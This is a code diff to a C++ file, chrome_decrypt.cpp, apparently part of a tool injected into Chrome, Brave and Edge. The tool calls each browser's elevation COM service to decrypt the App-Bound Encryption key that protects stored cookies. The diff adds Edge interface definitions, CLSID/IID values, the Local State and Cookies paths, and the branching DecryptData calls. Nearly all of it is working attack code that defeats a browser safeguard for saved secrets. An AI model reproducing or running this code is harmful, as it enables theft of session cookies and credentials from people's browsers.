@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.7.0 (c) Alexander 'xaitax' Hagenah
+// v0.8.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 /*
  * Chrome App-Bound Encryption Service:
@@ -114,7 +114,7 @@ enum class ProtectionLevel
 };
 
 MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
-IElevator : public IUnknown
+IOriginalBaseElevator : public IUnknown
 {
 public:
     virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
@@ -134,6 +134,35 @@ public:
         BSTR *plaintext,
         DWORD *last_error) = 0;
 };
+
+MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
+IEdgeElevatorBase_Placeholder : public IUnknown
+{
+public:
+    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
+    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
+    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
+};
+
+MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
+IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder 
+{
+public:
+    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
+        const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
+        const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;
+    virtual HRESULT STDMETHODCALLTYPE EncryptData(
+        ProtectionLevel protection_level, const BSTR plaintext,
+        BSTR *ciphertext, DWORD *last_error) = 0;
+    virtual HRESULT STDMETHODCALLTYPE DecryptData(
+        const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
+};
+
+MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
+IEdgeElevatorFinal : public IEdgeIntermediateElevator
+{
+};
+
 
 namespace ChromeAppBound
 {
@@ -227,11 +256,8 @@ namespace ChromeAppBound
             },
             {
                 "edge", {
-                    {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
-                    {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
-                    // Try the below values if Brave isn't installed
-                    // {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
-                    // {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
+                    {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
+                    {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
                     "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                     fs::path("Microsoft") / "Edge" / "User Data" / "Local State",
                     fs::path("Microsoft") / "Edge" / "User Data" / "Default" / "Network" / "Cookies",
@@ -1056,16 +1082,45 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
         return 1;
     }
 
-    Microsoft::WRL::ComPtr<IElevator> elevator;
-    HRESULT hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, &elevator);
+    HRESULT hr_create = E_FAIL;
+    HRESULT hr_proxy = E_FAIL;
+    HRESULT hr_decrypt = E_FAIL;
+    BSTR bstrPlainKey = nullptr;
+    DWORD lastComError = 0;
 
-    if (FAILED(hr_create))
-    {
+    Microsoft::WRL::ComPtr<IOriginalBaseElevator> chromeBraveElevator;
+    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edgeElevator;
+
+    if (browserType_worker == "edge") {
+        hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, 
+                                    cfg.iid,
+                                    &edgeElevator);
+        if (SUCCEEDED(hr_create)) {
+            Logging::Log("[+] IElevator instance created for Edge.");
+            hr_proxy = CoSetProxyBlanket(
+                edgeElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
+                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+        }
+    } else {
+        hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, 
+                                    cfg.iid,
+                                    &chromeBraveElevator);
+        if (SUCCEEDED(hr_create)) {
+            Logging::Log("[+] IElevator instance created for " + cfg.name + ".");
+            hr_proxy = CoSetProxyBlanket(
+                chromeBraveElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
+                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+        }
+    }
+
+    if (FAILED(hr_create)) {
         std::ostringstream err;
-        err << "[-] CoCreateInstance for IElevator failed: 0x" << std::hex << hr_create;
+        err << "[-] CoCreateInstance for specified IElevator interface failed: 0x" << std::hex << hr_create;
         Logging::Log(err.str());
         if (hr_create == REGDB_E_CLASSNOTREG)
-            Logging::Log("    Details: Class not registered for " + cfg.name + ".");
+            Logging::Log("    Details: Class not registered for " + cfg.name + " with IID: " + ChromeAppBound::WCharArrToString(reinterpret_cast<const WCHAR*>(&cfg.iid)) + ".");
+        else if (hr_create == E_NOINTERFACE)
+            Logging::Log("    Details: E_NOINTERFACE. The COM object does not support the requested interface IID: " + ChromeAppBound::WCharArrToString(reinterpret_cast<const WCHAR*>(&cfg.iid)) + ".");
         else if (hr_create == E_ACCESSDENIED)
             Logging::Log("    Details: Access denied.");
         else if (hr_create == CO_E_SERVER_EXEC_FAILURE)
@@ -1074,11 +1129,6 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
             FreeLibraryAndExitThread(hModule_dll_copy, 1);
         return 1;
     }
-    Logging::Log("[+] IElevator instance created for " + cfg.name + ".");
-
-    HRESULT hr_proxy = CoSetProxyBlanket(
-        elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
-        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
 
     if (FAILED(hr_proxy))
     {
@@ -1120,9 +1170,21 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
     { if (b) SysFreeString(b); };
     std::unique_ptr<OLECHAR[], decltype(bstrEncKeyFreer)> bstrEncKeyPtr(bstrEncKey, bstrEncKeyFreer);
 
-    BSTR bstrPlainKey = nullptr;
-    DWORD lastComError = 0;
-    HRESULT hr_decrypt = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
+    if (browserType_worker == "edge") {
+        if (edgeElevator) { 
+            hr_decrypt = edgeElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
+        } else { 
+            Logging::Log("[-] Edge elevator ComPtr is null before DecryptData call.");
+            hr_decrypt = E_POINTER; 
+        }
+    } else {
+        if (chromeBraveElevator) { 
+            hr_decrypt = chromeBraveElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
+        } else { 
+            Logging::Log("[-] Chrome/Brave elevator ComPtr is null before DecryptData call.");
+            hr_decrypt = E_POINTER; 
+        }
+    }
 
     auto bstrPlainKeyFreer = [](BSTR b)
     { if (b) SysFreeString(b); };
